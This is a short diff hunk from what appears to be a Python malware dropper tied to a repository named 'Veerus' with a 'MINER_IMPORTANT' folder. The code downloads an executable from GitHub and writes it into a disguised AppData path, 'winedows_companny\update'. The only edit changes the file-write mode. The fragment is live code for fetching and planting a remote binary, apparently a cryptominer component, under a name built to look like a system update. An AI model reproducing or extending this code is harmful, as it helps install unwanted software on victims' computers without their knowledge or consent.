@@ -547,7 +547,7 @@ if yes == "yes":
 
 				''')
 				r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/cUrl.exe?raw=true")
-				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb') as f:
+				with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe", 'wb+') as f:
 					f.write(r.content)
 			except Exception as e:
 				print(e)
